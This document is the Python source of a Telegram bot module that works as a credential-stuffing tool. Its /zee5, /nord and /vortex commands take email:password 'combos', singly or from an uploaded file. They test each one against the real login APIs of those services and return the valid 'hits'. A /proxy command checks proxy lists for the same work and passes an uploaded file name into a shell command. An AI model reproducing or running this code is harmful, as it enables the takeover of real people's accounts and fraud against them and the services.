import os
import telethon
import requests
from telethon import TelegramClient, events, functions, Button
from telethon.tl.functions.users import GetFullUserRequest

from Miley import tbot, OWNER_ID
sedpath = "./starkgangz/"
if not os.path.isdir(sedpath):
    os.makedirs(sedpath)

temp = './'

data = {
    "User-Agent": "NordApp android (playstore/2.8.6) Android 9.0.0",
    "Content-Length": "55",
    "Accept-Encoding": "gzip",
}

data2 = {"accept-encoding": "gzip", "user-agent": "RemotrAndroid/1.5.0"}


face = {
	"Accept-Encoding": "gzip, deflate, br",
	"Accept-Language": "en-US,en;q=0.9",
	"Connection": "keep-alive",
	"Content-Length": "136",
	"Content-Type": "application/json;charset=UTF-8",
	"Host": "userauth.voot.com",
	"Origin": "https://www.voot.com",
	"Referer": "https://www.voot.com",
	"Sec-Fetch-Dest": "empty",
	"Sec-Fetch-Mode": "cors",
	"Sec-Fetch-Site": "same-site",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.66"
}


@tbot.on(events.NewMessage(pattern="^/proxy$"))
async def Devsexpo(event):
    ok = await event.reply(
        "Checking Proxies Please Wait."
    )
    pablo = await event.get_reply_message()
    if pablo == None:
        await event.reply('Reply To File')
        return
    escobar = await tbot.download_media(pablo.media, temp)
    cmd = f"python3 -m PyProxyToolkit.Console -i {escobar} -o goood.txt -t 80 -x 20 -s httpbinStrategy"
    os.system(cmd)
    file = open("goood.txt", "r")
    Counter = 0
    Content = file.read()
    CoList = Content.split("\n")
    for i in CoList:
        if i:
            Counter += 1
    file.close()
    if Counter <= 0:
        await ok.edit(
            "Check Failed. Either Your File Has All Bad Proxies Or Your Proxy File Is Invalid."
        )
    elif Counter >= 1:
        file1 = open("goood.txt", "a")
        file1.write("\nChecked by MissMiley_Robot\n")
        file1.close()
        ok.delete()
        await tbot.send_file(
            event.chat_id,
            "goood.txt",
            caption=f"**PROXIES CHECKED**\n**GOOD PROXIES: ** {Counter}\n\n**Checked by MissMiley_Robot",
        )
        os.remove(escobar)
        os.remove("goood.txt")




@tbot.on(events.NewMessage(pattern="^/zee5 ?(.*)"))
async def Devsexpo(event):
    input_str = event.pattern_match.group(1)
    if input_str == "combo":
        ok = await event.reply(
            "`Checking Your Combos File. This May Take Time Depending On No of Combos.`"
        )
        stark_dict = []
        hits_dict = []
        hits = 0
        bads = 0
        lol = await event.get_reply_message()
        if lol == None:
            await ok.edit('Reply To File')
            return
        starky = await tbot.download_media(lol.media, temp)
        with open(starky) as f:
            stark_dict = f.read().splitlines()
        if len(stark_dict) > 30:
            await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
            return
        os.remove(starky)
        for i in stark_dict:
            starkm = i.split(":")
            email = starkm[0]
            password = starkm[1]
            try:
                meke = requests.get(
                    f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
                ).json()
            except BaseException:
                meke = None
            if meke.get("token"):
                hits += 1
                hits_dict.append(f"{email}:{password}")
            else:
                bads += 1
        if len(hits_dict) == 0:
            await ok.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
            return
        with open("hits.txt", "w") as hitfile:
            for s in hits_dict:
                hitfile.write(s + " | @MissMiley_Robot")
        ok.delete()
        await tbot.send_file(
            event.chat_id,
            "hits.txt",
            caption=f"**!ZEE5 HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
        )
        os.remove("hits.txt")
    else:
        if input_str:
            if ":" in input_str:
                stark = input_str.split(":", 1)
            else:
                await event.reply("**! No Lol, use email:pass Regex !**")
                return
        else:
            await event.reply("**Give Combos To Check**")
            return
        email = stark[0]
        password = stark[1]
        meke = requests.get(
            f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
        ).json()
        beautifuln = f"""
💖 **Checked Zee5 Account**
**Combo:** {email}:{password}
**Email:** {email}
**Password:-** {password}
**Response:-** This Account Is Invalid. 😔

🔱 **Checked By:-** {event.sender_id}
"""

        beautiful = f"""
💖 **Checked Zee5 Account**
**Combo:** {email}:{password}
**Email:** {email}
**Password:-** {password}
**Response:-** This Account Is valid.😀
**Login Here**: www.zee5.com

🔱 **Checked By:-** {event.sender_id}
"""
        if meke.get("token"):
            await event.reply(beautiful)
        else:
            await event.reply(beautifuln)


@tbot.on(events.NewMessage(pattern="^/nord ?(.*)"))
async def Devsexpo(event):
    input_str = event.pattern_match.group(1)
    if input_str == "combo":
        ok = await event.reply(
            "`Checking Your Combos File. This May Take Time Depending On No of Combos.`"
        )
        stark_dict = []
        hits_dict = []
        hits = 0
        bads = 0
        lol = await event.get_reply_message()
        if lol == None:
            await event.reply('Reply To File')
            return
        starky = await tbot.download_media(lol.media, temp)
        with open(starky) as f:
            stark_dict = f.read().splitlines()
        if len(stark_dict) > 30:
            await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
            return
        os.remove(starky)
        for i in stark_dict:
            starkm = i.split(":")
            email = starkm[0]
            password = starkm[1]
            sedlyf = {"username": email, "password": password}
            try:
                meke = requests.post(
                    url="https://zwyr157wwiu6eior.com/v1/users/tokens",
                    headers=data,
                    json=sedlyf,
                ).json()
            except BaseException:
                meke = None
            if meke.get("token"):
                hits += 1
                hits_dict.append(f"{email}:{password}")
            else:
                bads += 1
        if len(hits_dict) == 0:
            await ok.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
            return
        with open("hits.txt", "w") as hitfile:
            for s in hits_dict:
                hitfile.write(s + " | @MissMiley_Robot")
        ok.delete()
        await tbot.send_file(
            event.chat_id,
            "hits.txt",
            caption=f"**!NORD HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
        )
        os.remove("hits.txt")
    else:
        if input_str:
            if ":" in input_str:
                stark = input_str.split(":", 1)
            else:
                await event.reply("**! No Lol, use email:pass Regex !**")
                return
        else:
            await event.reply("**Give Combos To Check**")
            return
        email = stark[0]
        password = stark[1]
        sedlyf = {"username": email, "password": password}
        meke = requests.post(
            url="https://zwyr157wwiu6eior.com/v1/users/tokens",
            headers=data,
            json=sedlyf,
        ).json()
        beautifuln = f"""
💖 **Checked Nord Account**
**Combo:** {email}:{password}
**Email:** {email}
**Password:-** {password}
**Response:-** This Account Is Invalid. 😔

🔱 **Checked By:-** {event.sender_id}
"""

        beautiful = f"""
💖 **Checked Nord Account**
**Combo:** {email}:{password}
**Email:** {email}
**Password:-** {password}
**Response:-** This Account Is valid.😀
**Login Here**: www.nordvpn.com

🔱 **Checked By:-** {event.sender_id}
"""
        if meke.get("token"):
            await event.reply(beautiful)
        else:
            await event.reply(beautifuln)


@tbot.on(events.NewMessage(pattern="^/vortex ?(.*)"))
async def vortex(event):
    input_str = event.pattern_match.group(1)
    if input_str == "combo":
        ok = await event.reply(
            "`Checking Your Combos File. This May Take Time Depending On No of Combos.`"
        )
        stark_dict = []
        hits_dict = []
        hits = 0
        bads = 0
        lol = await event.get_reply_message()
        if lol == None:
            await event.reply('Reply To File')
            return
        starky = await tbot.download_media(lol.media, temp)
        with open(starky) as f:
            stark_dict = f.read().splitlines()
        if len(stark_dict) > 20:
            await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
            return
        os.remove(starky)
        for i in stark_dict:
            starkm = i.split(":")
            email = starkm[0]
            password = starkm[1]
            sedlyf = {"username": email, "password": password}
            try:
                meke = requests.post(
                    url="https://vortex-api.gg/login", headers=data2, json=sedlyf
                ).json()
            except BaseException:
                meke = None
            if meke.get("token"):
                hits += 1
                hits_dict.append(f"{email}:{password}")
            else:
                bads += 1
        if len(hits_dict) == 0:
            await ok.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
            return
        with open("hits.txt", "w") as hitfile:
            for s in hits_dict:
                hitfile.write(s + " | @MissMiley_Bot")
        ok.delete()
        await tbot.send_file(
            event.chat_id,
            "hits.txt",
            caption=f"**!VORTEX HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
        )
        os.remove("hits.txt")
    else:
        if input_str:
            if ":" in input_str:
                stark = input_str.split(":", 1)
            else:
                await event.reply("**! No Lol, use email:pass Regex !**")
                return
        else:
            await event.reply("**Give Combos To Check**")
            return
        email = stark[0]
        password = stark[1]
        sedlyf = {"username": email, "password": password}
        meke = requests.post(
            url="https://vortex-api.gg/login", headers=data2, json=sedlyf
        ).json()
        beautifuln = f"""
💖 **Checked Vortex Account**
**Combo:** {email}:{password}
**Email:** {email}
**Password:-** {password}
**Response:-** This Account Is Invalid. 😔

🔱 **Checked By:-** {event.sender_id}
"""

        beautiful = f"""
💖 **Checked Vortex Account**
**Combo:** {email}:{password}
**Email:** {email}
**Password:-** {password}
**Response:-** This Account Is valid.😀
**Login Here**: www.vortex.gg

🔱 **Checked By:-** {event.sender_id}
"""
        if meke.get("token"):
            await event.reply(beautiful)
        else:
            await event.reply(beautifuln)

__help__ = """
- /zee5 <email:password> - Checks One Account
- /zee5 combo - Reply To Combos File And Limit is 20.
- /nord <email:password> - Checks One Account
- /nord combo - Reply To Combos File And Limit is 20.
- /vortex <email:password> - Checks One Account
- /vortex combo - Reply To Combos File And Limit is 20.
- /proxy - Reply To Proxy File Only, Check Your Proxies
"""
